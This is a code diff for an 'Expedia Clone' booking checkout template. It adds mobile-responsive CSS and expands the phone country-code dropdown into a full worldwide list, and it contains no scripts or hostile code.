@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Critical for Mobile -->
 <title>Secure Booking – Expedia Clone</title>
 <style>
 /* ── Reset & Base ── */
@@ -9,8 +10,8 @@
 body{font-family:Arial,sans-serif;background:#f5f5f5;color:#1a1a1a;font-size:14px;line-height:1.5}
 
 /* ── Header ── */
-.hdr{border-bottom:1px solid #e0e0e0;display:flex;align-items:center;padding:16px 74px}
-.logo{display:flex;align-items:center;gap:7px;text-decoration:none; margin-left: 124px}
+.hdr{border-bottom:1px solid #e0e0e0;display:flex;align-items:center;padding:16px 24px; background: #fff;}
+.logo{display:flex;align-items:center;gap:7px;text-decoration:none;}
 .logo-box{width:28px;height:28px;background:#c8a84b;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .logo-box svg{width:16px;height:16px}
 .logo-text{font-size:19px;font-weight:700;color:#1a1a1a;letter-spacing:-.3px}
@@ -80,7 +81,7 @@ input[type=email].err{background:#fff8f8}
 .exp-row{display:flex;gap:10px}
 .bill-divider{border:none;border-top:1px solid #e0e0e0;margin:6px 0 20px}
 
-/* ── Protection Section (Restored) ── */
+/* ── Protection Section ── */
 .protect-section{background:#fff;border:1px solid #d8d8d8;border-radius:8px;padding:22px 26px;margin-bottom:14px}
 .protect-header{display:flex;align-items:center;gap:8px;margin-bottom:15px}
 .rec-badge{background:#27ae60;color:#fff;font-size:11px;font-weight:700;padding:2px 6px;border-radius:3px;text-transform:uppercase}
@@ -108,7 +109,7 @@ input[type=email].err{background:#fff8f8}
 .consent-text{font-size:13px;color:#333;margin-bottom:16px;line-height:1.6}
 .consent-text a{color:#006fcf;text-decoration:none}
 .consent-text a:hover{text-decoration:underline}
-.btn-book{background:#006fcf;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:16px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
+.btn-book{background:#006fcf;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:16px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:8px; width: 100%; justify-content: center;}
 .btn-book:hover{background:#005aa3}
 .secure-note{display:flex;align-items:flex-start;gap:8px;font-size:13px;color:#555;margin-top:14px}
 .secure-note svg{flex-shrink:0;margin-top:1px}
@@ -151,12 +152,77 @@ input[type=email].err{background:#fff8f8}
 .ps-total{display:flex;justify-content:space-between;font-size:14px;padding-top:8px;border-top:1px solid #e0e0e0;margin-top:4px}
 .side-note{font-size:12px;color:#6b6b6b;margin-top:14px;line-height:1.5}
 
-/* Mobile Responsive */
-@media(max-width:768px){
-    .cols{flex-direction:column}
-    .col-side{width:100%;order:-1} /* Sidebar on top for mobile */
-    .row{flex-direction:column;gap:10px}
-    .protect-options{flex-direction:column}
+/* ─────────────────────────────────────────── */
+/* ── MOBILE RESPONSIVE STYLES ── */
+/* ─────────────────────────────────────────── */
+@media(max-width: 900px){
+    /* Stack Columns: Sidebar goes to TOP on mobile */
+    .cols {
+        flex-direction: column-reverse; /* Main content bottom, Sidebar top */
+    }
+    
+    .col-side {
+        width: 100%;
+        flex: none;
+        position: static; /* Stop sticking on mobile */
+        margin-bottom: 20px;
+    }
+
+    .col-main {
+        width: 100%;
+    }
+
+    /* Header Adjustments */
+    .hdr {
+        padding: 12px 16px;
+    }
+    .logo-text {
+        font-size: 16px;
+    }
+
+    /* Form Rows Stack Vertically */
+    .row {
+        flex-direction: column;
+        gap: 16px;
+    }
+    
+    .col {
+        width: 100%;
+    }
+
+    /* Date of Birth & Expiry Date Stacking */
+    .exp-row, 
+    div[style*="display:flex;gap:10px"] {
+        flex-direction: column !important;
+        gap: 10px !important;
+    }
+    
+    /* Fix specific inline styles for DOB/Expiry selects */
+    select[name="dob_month"], select[name="dob_day"], select[name="dob_year"],
+    select[name="exp_month"], select[name="exp_year"] {
+        width: 100% !important;
+    }
+
+    /* Protection Plan Stacking */
+    .protect-options {
+        flex-direction: column;
+    }
+
+    /* Promo Card Stacking */
+    .promo-body {
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+    }
+    .promo-right {
+        width: 100%;
+        min-width: auto;
+    }
+
+    /* Sidebar Flight Details */
+    .flt-route, .flt-date, .flt-time, .flt-airline {
+        font-size: 13px;
+    }
 }
 </style>
 </head>
@@ -180,7 +246,7 @@ input[type=email].err{background:#fff8f8}
 
   <div class="cols">
 
-    <!-- LEFT COLUMN -->
+    <!-- LEFT COLUMN (Main Form) -->
     <div class="col-main">
 
       <!-- OneKeyCash Banner -->
@@ -238,10 +304,181 @@ input[type=email].err{background:#fff8f8}
           <div class="fg">
             <label class="lbl">Country/Territory Code <span class="r">*</span></label>
             <select name="country_code">
-              <option value="+1" {{ old('country_code','+1')=='+1'?'selected':'' }}>United States of America +1</option>
-              <option value="+44" {{ old('country_code')=='+44'?'selected':'' }}>United Kingdom +44</option>
-              <option value="+91" {{ old('country_code')=='+91'?'selected':'' }}>India +91</option>
-              <option value="+234" {{ old('country_code')=='+234'?'selected':'' }}>Nigeria +234</option>
+                <option value="">Select Country Code</option>
+                <option value="+93"  {{ old('country_code')=='+93' ?'selected':'' }}>Afghanistan +93</option>
+                <option value="+355" {{ old('country_code')=='+355'?'selected':'' }}>Albania +355</option>
+                <option value="+213" {{ old('country_code')=='+213'?'selected':'' }}>Algeria +213</option>
+                <option value="+376" {{ old('country_code')=='+376'?'selected':'' }}>Andorra +376</option>
+                <option value="+244" {{ old('country_code')=='+244'?'selected':'' }}>Angola +244</option>
+                <option value="+54"  {{ old('country_code')=='+54' ?'selected':'' }}>Argentina +54</option>
+                <option value="+374" {{ old('country_code')=='+374'?'selected':'' }}>Armenia +374</option>
+                <option value="+61"  {{ old('country_code')=='+61' ?'selected':'' }}>Australia +61</option>
+                <option value="+43"  {{ old('country_code')=='+43' ?'selected':'' }}>Austria +43</option>
+                <option value="+994" {{ old('country_code')=='+994'?'selected':'' }}>Azerbaijan +994</option>
+                <option value="+973" {{ old('country_code')=='+973'?'selected':'' }}>Bahrain +973</option>
+                <option value="+880" {{ old('country_code')=='+880'?'selected':'' }}>Bangladesh +880</option>
+                <option value="+375" {{ old('country_code')=='+375'?'selected':'' }}>Belarus +375</option>
+                <option value="+32"  {{ old('country_code')=='+32' ?'selected':'' }}>Belgium +32</option>
+                <option value="+501" {{ old('country_code')=='+501'?'selected':'' }}>Belize +501</option>
+                <option value="+229" {{ old('country_code')=='+229'?'selected':'' }}>Benin +229</option>
+                <option value="+975" {{ old('country_code')=='+975'?'selected':'' }}>Bhutan +975</option>
+                <option value="+591" {{ old('country_code')=='+591'?'selected':'' }}>Bolivia +591</option>
+                <option value="+387" {{ old('country_code')=='+387'?'selected':'' }}>Bosnia and Herzegovina +387</option>
+                <option value="+267" {{ old('country_code')=='+267'?'selected':'' }}>Botswana +267</option>
+                <option value="+55"  {{ old('country_code')=='+55' ?'selected':'' }}>Brazil +55</option>
+                <option value="+673" {{ old('country_code')=='+673'?'selected':'' }}>Brunei +673</option>
+                <option value="+359" {{ old('country_code')=='+359'?'selected':'' }}>Bulgaria +359</option>
+                <option value="+226" {{ old('country_code')=='+226'?'selected':'' }}>Burkina Faso +226</option>
+                <option value="+257" {{ old('country_code')=='+257'?'selected':'' }}>Burundi +257</option>
+                <option value="+855" {{ old('country_code')=='+855'?'selected':'' }}>Cambodia +855</option>
+                <option value="+237" {{ old('country_code')=='+237'?'selected':'' }}>Cameroon +237</option>
+                <option value="+1"   {{ old('country_code','+1')=='+1'?'selected':'' }}>Canada +1</option>
+                <option value="+238" {{ old('country_code')=='+238'?'selected':'' }}>Cape Verde +238</option>
+                <option value="+236" {{ old('country_code')=='+236'?'selected':'' }}>Central African Republic +236</option>
+                <option value="+235" {{ old('country_code')=='+235'?'selected':'' }}>Chad +235</option>
+                <option value="+56"  {{ old('country_code')=='+56' ?'selected':'' }}>Chile +56</option>
+                <option value="+86"  {{ old('country_code')=='+86' ?'selected':'' }}>China +86</option>
+                <option value="+57"  {{ old('country_code')=='+57' ?'selected':'' }}>Colombia +57</option>
+                <option value="+269" {{ old('country_code')=='+269'?'selected':'' }}>Comoros +269</option>
+                <option value="+242" {{ old('country_code')=='+242'?'selected':'' }}>Congo +242</option>
+                <option value="+243" {{ old('country_code')=='+243'?'selected':'' }}>Congo (DRC) +243</option>
+                <option value="+506" {{ old('country_code')=='+506'?'selected':'' }}>Costa Rica +506</option>
+                <option value="+225" {{ old('country_code')=='+225'?'selected':'' }}>Côte d'Ivoire +225</option>
+                <option value="+385" {{ old('country_code')=='+385'?'selected':'' }}>Croatia +385</option>
+                <option value="+53"  {{ old('country_code')=='+53' ?'selected':'' }}>Cuba +53</option>
+                <option value="+357" {{ old('country_code')=='+357'?'selected':'' }}>Cyprus +357</option>
+                <option value="+420" {{ old('country_code')=='+420'?'selected':'' }}>Czech Republic +420</option>
+                <option value="+45"  {{ old('country_code')=='+45' ?'selected':'' }}>Denmark +45</option>
+                <option value="+253" {{ old('country_code')=='+253'?'selected':'' }}>Djibouti +253</option>
+                <option value="+1"   {{ old('country_code')=='+1Dominican'?'selected':'' }}>Dominican Republic +1</option>
+                <option value="+593" {{ old('country_code')=='+593'?'selected':'' }}>Ecuador +593</option>
+                <option value="+20"  {{ old('country_code')=='+20' ?'selected':'' }}>Egypt +20</option>
+                <option value="+503" {{ old('country_code')=='+503'?'selected':'' }}>El Salvador +503</option>
+                <option value="+240" {{ old('country_code')=='+240'?'selected':'' }}>Equatorial Guinea +240</option>
+                <option value="+291" {{ old('country_code')=='+291'?'selected':'' }}>Eritrea +291</option>
+                <option value="+372" {{ old('country_code')=='+372'?'selected':'' }}>Estonia +372</option>
+                <option value="+268" {{ old('country_code')=='+268'?'selected':'' }}>Eswatini +268</option>
+                <option value="+251" {{ old('country_code')=='+251'?'selected':'' }}>Ethiopia +251</option>
+                <option value="+679" {{ old('country_code')=='+679'?'selected':'' }}>Fiji +679</option>
+                <option value="+358" {{ old('country_code')=='+358'?'selected':'' }}>Finland +358</option>
+                <option value="+33"  {{ old('country_code')=='+33' ?'selected':'' }}>France +33</option>
+                <option value="+241" {{ old('country_code')=='+241'?'selected':'' }}>Gabon +241</option>
+                <option value="+220" {{ old('country_code')=='+220'?'selected':'' }}>Gambia +220</option>
+                <option value="+995" {{ old('country_code')=='+995'?'selected':'' }}>Georgia +995</option>
+                <option value="+49"  {{ old('country_code')=='+49' ?'selected':'' }}>Germany +49</option>
+                <option value="+233" {{ old('country_code')=='+233'?'selected':'' }}>Ghana +233</option>
+                <option value="+30"  {{ old('country_code')=='+30' ?'selected':'' }}>Greece +30</option>
+                <option value="+502" {{ old('country_code')=='+502'?'selected':'' }}>Guatemala +502</option>
+                <option value="+224" {{ old('country_code')=='+224'?'selected':'' }}>Guinea +224</option>
+                <option value="+245" {{ old('country_code')=='+245'?'selected':'' }}>Guinea-Bissau +245</option>
+                <option value="+592" {{ old('country_code')=='+592'?'selected':'' }}>Guyana +592</option>
+                <option value="+509" {{ old('country_code')=='+509'?'selected':'' }}>Haiti +509</option>
+                <option value="+504" {{ old('country_code')=='+504'?'selected':'' }}>Honduras +504</option>
+                <option value="+852" {{ old('country_code')=='+852'?'selected':'' }}>Hong Kong +852</option>
+                <option value="+36"  {{ old('country_code')=='+36' ?'selected':'' }}>Hungary +36</option>
+                <option value="+354" {{ old('country_code')=='+354'?'selected':'' }}>Iceland +354</option>
+                <option value="+91"  {{ old('country_code')=='+91' ?'selected':'' }}>India +91</option>
+                <option value="+62"  {{ old('country_code')=='+62' ?'selected':'' }}>Indonesia +62</option>
+                <option value="+98"  {{ old('country_code')=='+98' ?'selected':'' }}>Iran +98</option>
+                <option value="+964" {{ old('country_code')=='+964'?'selected':'' }}>Iraq +964</option>
+                <option value="+353" {{ old('country_code')=='+353'?'selected':'' }}>Ireland +353</option>
+                <option value="+972" {{ old('country_code')=='+972'?'selected':'' }}>Israel +972</option>
+                <option value="+39"  {{ old('country_code')=='+39' ?'selected':'' }}>Italy +39</option>
+                <option value="+1876"{{ old('country_code')=='+1876'?'selected':'' }}>Jamaica +1876</option>
+                <option value="+81"  {{ old('country_code')=='+81' ?'selected':'' }}>Japan +81</option>
+                <option value="+962" {{ old('country_code')=='+962'?'selected':'' }}>Jordan +962</option>
+                <option value="+7"   {{ old('country_code')=='+7Kazakhstan'?'selected':'' }}>Kazakhstan +7</option>
+                <option value="+254" {{ old('country_code')=='+254'?'selected':'' }}>Kenya +254</option>
+                <option value="+383" {{ old('country_code')=='+383'?'selected':'' }}>Kosovo +383</option>
+                <option value="+965" {{ old('country_code')=='+965'?'selected':'' }}>Kuwait +965</option>
+                <option value="+996" {{ old('country_code')=='+996'?'selected':'' }}>Kyrgyzstan +996</option>
+                <option value="+856" {{ old('country_code')=='+856'?'selected':'' }}>Laos +856</option>
+                <option value="+371" {{ old('country_code')=='+371'?'selected':'' }}>Latvia +371</option>
+                <option value="+961" {{ old('country_code')=='+961'?'selected':'' }}>Lebanon +961</option>
+                <option value="+266" {{ old('country_code')=='+266'?'selected':'' }}>Lesotho +266</option>
+                <option value="+231" {{ old('country_code')=='+231'?'selected':'' }}>Liberia +231</option>
+                <option value="+218" {{ old('country_code')=='+218'?'selected':'' }}>Libya +218</option>
+                <option value="+423" {{ old('country_code')=='+423'?'selected':'' }}>Liechtenstein +423</option>
+                <option value="+370" {{ old('country_code')=='+370'?'selected':'' }}>Lithuania +370</option>
+                <option value="+352" {{ old('country_code')=='+352'?'selected':'' }}>Luxembourg +352</option>
+                <option value="+853" {{ old('country_code')=='+853'?'selected':'' }}>Macau +853</option>
+                <option value="+261" {{ old('country_code')=='+261'?'selected':'' }}>Madagascar +261</option>
+                <option value="+265" {{ old('country_code')=='+265'?'selected':'' }}>Malawi +265</option>
+                <option value="+60"  {{ old('country_code')=='+60' ?'selected':'' }}>Malaysia +60</option>
+                <option value="+960" {{ old('country_code')=='+960'?'selected':'' }}>Maldives +960</option>
+                <option value="+223" {{ old('country_code')=='+223'?'selected':'' }}>Mali +223</option>
+                <option value="+356" {{ old('country_code')=='+356'?'selected':'' }}>Malta +356</option>
+                <option value="+222" {{ old('country_code')=='+222'?'selected':'' }}>Mauritania +222</option>
+                <option value="+230" {{ old('country_code')=='+230'?'selected':'' }}>Mauritius +230</option>
+                <option value="+52"  {{ old('country_code')=='+52' ?'selected':'' }}>Mexico +52</option>
+                <option value="+373" {{ old('country_code')=='+373'?'selected':'' }}>Moldova +373</option>
+                <option value="+976" {{ old('country_code')=='+976'?'selected':'' }}>Mongolia +976</option>
+                <option value="+382" {{ old('country_code')=='+382'?'selected':'' }}>Montenegro +382</option>
+                <option value="+212" {{ old('country_code')=='+212'?'selected':'' }}>Morocco +212</option>
+                <option value="+258" {{ old('country_code')=='+258'?'selected':'' }}>Mozambique +258</option>
+                <option value="+95"  {{ old('country_code')=='+95' ?'selected':'' }}>Myanmar +95</option>
+                <option value="+264" {{ old('country_code')=='+264'?'selected':'' }}>Namibia +264</option>
+                <option value="+977" {{ old('country_code')=='+977'?'selected':'' }}>Nepal +977</option>
+                <option value="+31"  {{ old('country_code')=='+31' ?'selected':'' }}>Netherlands +31</option>
+                <option value="+64"  {{ old('country_code')=='+64' ?'selected':'' }}>New Zealand +64</option>
+                <option value="+505" {{ old('country_code')=='+505'?'selected':'' }}>Nicaragua +505</option>
+                <option value="+227" {{ old('country_code')=='+227'?'selected':'' }}>Niger +227</option>
+                <option value="+234" {{ old('country_code')=='+234'?'selected':'' }}>Nigeria +234</option>
+                <option value="+850" {{ old('country_code')=='+850'?'selected':'' }}>North Korea +850</option>
+                <option value="+389" {{ old('country_code')=='+389'?'selected':'' }}>North Macedonia +389</option>
+                <option value="+47"  {{ old('country_code')=='+47' ?'selected':'' }}>Norway +47</option>
+                <option value="+968" {{ old('country_code')=='+968'?'selected':'' }}>Oman +968</option>
+                <option value="+92"  {{ old('country_code')=='+92' ?'selected':'' }}>Pakistan +92</option>
+                <option value="+507" {{ old('country_code')=='+507'?'selected':'' }}>Panama +507</option>
+                <option value="+675" {{ old('country_code')=='+675'?'selected':'' }}>Papua New Guinea +675</option>
+                <option value="+595" {{ old('country_code')=='+595'?'selected':'' }}>Paraguay +595</option>
+                <option value="+51"  {{ old('country_code')=='+51' ?'selected':'' }}>Peru +51</option>
+                <option value="+63"  {{ old('country_code')=='+63' ?'selected':'' }}>Philippines +63</option>
+                <option value="+48"  {{ old('country_code')=='+48' ?'selected':'' }}>Poland +48</option>
+                <option value="+351" {{ old('country_code')=='+351'?'selected':'' }}>Portugal +351</option>
+                <option value="+974" {{ old('country_code')=='+974'?'selected':'' }}>Qatar +974</option>
+                <option value="+40"  {{ old('country_code')=='+40' ?'selected':'' }}>Romania +40</option>
+                <option value="+7"   {{ old('country_code')=='+7Russia'?'selected':'' }}>Russia +7</option>
+                <option value="+250" {{ old('country_code')=='+250'?'selected':'' }}>Rwanda +250</option>
+                <option value="+966" {{ old('country_code')=='+966'?'selected':'' }}>Saudi Arabia +966</option>
+                <option value="+221" {{ old('country_code')=='+221'?'selected':'' }}>Senegal +221</option>
+                <option value="+381" {{ old('country_code')=='+381'?'selected':'' }}>Serbia +381</option>
+                <option value="+232" {{ old('country_code')=='+232'?'selected':'' }}>Sierra Leone +232</option>
+                <option value="+65"  {{ old('country_code')=='+65' ?'selected':'' }}>Singapore +65</option>
+                <option value="+421" {{ old('country_code')=='+421'?'selected':'' }}>Slovakia +421</option>
+                <option value="+386" {{ old('country_code')=='+386'?'selected':'' }}>Slovenia +386</option>
+                <option value="+252" {{ old('country_code')=='+252'?'selected':'' }}>Somalia +252</option>
+                <option value="+27"  {{ old('country_code')=='+27' ?'selected':'' }}>South Africa +27</option>
+                <option value="+82"  {{ old('country_code')=='+82' ?'selected':'' }}>South Korea +82</option>
+                <option value="+211" {{ old('country_code')=='+211'?'selected':'' }}>South Sudan +211</option>
+                <option value="+34"  {{ old('country_code')=='+34' ?'selected':'' }}>Spain +34</option>
+                <option value="+94"  {{ old('country_code')=='+94' ?'selected':'' }}>Sri Lanka +94</option>
+                <option value="+249" {{ old('country_code')=='+249'?'selected':'' }}>Sudan +249</option>
+                <option value="+597" {{ old('country_code')=='+597'?'selected':'' }}>Suriname +597</option>
+                <option value="+46"  {{ old('country_code')=='+46' ?'selected':'' }}>Sweden +46</option>
+                <option value="+41"  {{ old('country_code')=='+41' ?'selected':'' }}>Switzerland +41</option>
+                <option value="+963" {{ old('country_code')=='+963'?'selected':'' }}>Syria +963</option>
+                <option value="+886" {{ old('country_code')=='+886'?'selected':'' }}>Taiwan +886</option>
+                <option value="+992" {{ old('country_code')=='+992'?'selected':'' }}>Tajikistan +992</option>
+                <option value="+255" {{ old('country_code')=='+255'?'selected':'' }}>Tanzania +255</option>
+                <option value="+66"  {{ old('country_code')=='+66' ?'selected':'' }}>Thailand +66</option>
+                <option value="+228" {{ old('country_code')=='+228'?'selected':'' }}>Togo +228</option>
+                <option value="+1868"{{ old('country_code')=='+1868'?'selected':'' }}>Trinidad and Tobago +1868</option>
+                <option value="+216" {{ old('country_code')=='+216'?'selected':'' }}>Tunisia +216</option>
+                <option value="+90"  {{ old('country_code')=='+90' ?'selected':'' }}>Turkey +90</option>
+                <option value="+993" {{ old('country_code')=='+993'?'selected':'' }}>Turkmenistan +993</option>
+                <option value="+256" {{ old('country_code')=='+256'?'selected':'' }}>Uganda +256</option>
+                <option value="+380" {{ old('country_code')=='+380'?'selected':'' }}>Ukraine +380</option>
+                <option value="+971" {{ old('country_code')=='+971'?'selected':'' }}>United Arab Emirates +971</option>
+                <option value="+44"  {{ old('country_code')=='+44' ?'selected':'' }}>United Kingdom +44</option>
+                <option value="+1"   {{ old('country_code','+1')=='+1'?'selected':'' }}>United States +1</option>
+                <option value="+598" {{ old('country_code')=='+598'?'selected':'' }}>Uruguay +598</option>
+                <option value="+998" {{ old('country_code')=='+998'?'selected':'' }}>Uzbekistan +998</option>
+                <option value="+58"  {{ old('country_code')=='+58' ?'selected':'' }}>Venezuela +58</option>
+                <option value="+84"  {{ old('country_code')=='+84' ?'selected':'' }}>Vietnam +84</option>
+                <option value="+967" {{ old('country_code')=='+967'?'selected':'' }}>Yemen +967</option>
+                <option value="+260" {{ old('country_code')=='+260'?'selected':'' }}>Zambia +260</option>
+                <option value="+263" {{ old('country_code')=='+263'?'selected':'' }}>Zimbabwe +263</option>
             </select>
           </div>
 
@@ -455,7 +692,7 @@ input[type=email].err{background:#fff8f8}
         </div>
       </div>
 
-      <!-- Flight Protection Plan (RESTORED & WORKING) -->
+      <!-- Flight Protection Plan -->
       <div class="protect-section">
         <div class="protect-header">
           <span class="rec-badge">Recommended</span>
